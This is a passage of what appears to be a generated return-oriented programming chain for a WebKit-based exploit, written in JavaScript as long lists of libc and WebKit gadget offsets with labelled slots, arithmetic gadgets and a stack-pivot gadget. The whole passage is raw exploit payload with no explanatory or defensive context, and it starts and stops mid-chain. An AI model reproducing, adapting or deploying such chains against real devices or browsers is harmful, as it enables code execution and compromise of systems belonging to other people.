webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1463:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121400, //L1465
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1464:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+121488, //L1467
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121504, //L1468
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1467:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121648, //L1472
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121616, //L1470
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121632, //L1471
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1470:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1471:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1472:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121720, //L1474
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1474:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121776, //L1475
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1475:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121856, //L1477
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1477:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1478:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1479:
db([32, 0]); // 0x20
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+121960, //L1480
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+121976, //L1481
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1480:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+122064, //L1483
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1483:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122120, //L1484
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1484:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122192, //L1487
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122248, //L1489
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1489:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122352, //L1491
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1490:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1491:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+122440, //L1493
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122456, //L1494
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1493:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1494:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122600, //L1498
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122568, //L1496
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122584, //L1497
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1496:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1497:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1498:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122672, //L1500
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1500:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+122728, //L1501
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1501:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122808, //L1503
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1503:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1504:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1505:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+122912, //L1506
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+122928, //L1507
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1506:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123016, //L1509
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123072, //L1510
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1510:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123192, //L1513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1512:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+123280, //L1515
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123296, //L1516
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1515:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123440, //L1520
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123408, //L1518
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123424, //L1519
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1518:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1519:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1520:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123512, //L1522
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1522:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123568, //L1523
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1523:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123648, //L1525
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1525:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1526:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1527:
db([33, 0]); // 0x21
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+123752, //L1528
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+123768, //L1529
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1528:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123856, //L1531
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123912, //L1532
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1532:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123984, //L1535
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1535:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124040, //L1537
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1537:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1538:
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124192, //L1540
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1539:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1540:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+124280, //L1542
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124296, //L1543
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1542:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1543:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124440, //L1547
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124408, //L1545
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124424, //L1546
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1545:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1546:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1547:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124512, //L1549
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1549:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124568, //L1550
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1550:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124648, //L1552
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1552:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1553:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1554:
db([34, 0]); // 0x22
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+124752, //L1555
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+124768, //L1556
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1555:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+124856, //L1558
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1558:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124912, //L1559
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1559:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124984, //L1562
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1562:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125040, //L1564
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1564:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1565:
libc_base+811575, //pop rsp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125192, //L1567
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1566:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1567:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+125280, //L1569
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125296, //L1570
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1569:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1570:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125440, //L1574
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125408, //L1572
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125424, //L1573
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1572:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1573:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1574:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125512, //L1576
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125568, //L1577
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1577:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125648, //L1579
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1579:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1580:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1581:
db([35, 0]); // 0x23
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+125752, //L1582
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+125768, //L1583
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1582:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1583:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+125856, //L1585
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1585:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125912, //L1586
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1586:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125984, //L1589
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1589:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126040, //L1591
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1591:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126144, //L1593
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1592:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126232, //L1595
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126248, //L1596
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1595:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126392, //L1600
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126360, //L1598
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126376, //L1599
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1598:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1599:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1600:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126488, //L1602
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1601:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1602:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126576, //L1604
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126592, //L1605
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1604:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126736, //L1609
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126704, //L1607
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126720, //L1608
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1607:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1608:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1609:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126808, //L1611
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1611:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126864, //L1612
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1612:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126944, //L1614
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1614:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1615:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1616:
db([36, 0]); // 0x24
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+127048, //L1617
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+127064, //L1618
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1617:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1618:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+127152, //L1620
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1620:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127208, //L1621
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1621:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127280, //L1624
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1624:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127336, //L1626
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1626:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
